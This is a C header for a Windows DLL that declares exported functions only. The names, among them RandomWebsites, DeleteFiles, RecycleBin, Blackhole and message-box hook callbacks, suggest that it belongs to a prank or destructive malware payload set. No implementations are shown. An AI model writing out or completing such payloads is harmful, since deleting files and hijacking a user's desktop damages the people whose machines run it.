#define DLLIMPORT __declspec(dllexport)
#include <Windows.h>
#include <shellapi.h>
#include <commctrl.h>
#include <shlobj.h>

// gcc comp
#define random rand
#include <stdio.h>
#include <math.h>

DLLIMPORT int WINAPI RandomWebsites(); 
DLLIMPORT int winver();
DLLIMPORT LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
DLLIMPORT int WINAPI DeleteFiles();
DLLIMPORT int Circle();
DLLIMPORT int WINAPI Question();
DLLIMPORT int WINAPI RecycleBin();
DLLIMPORT int sineCurve();
DLLIMPORT int Blackhole();
DLLIMPORT LRESULT CALLBACK msgBoxHookTempCopy(int nCode, WPARAM wParam, LPARAM lParam);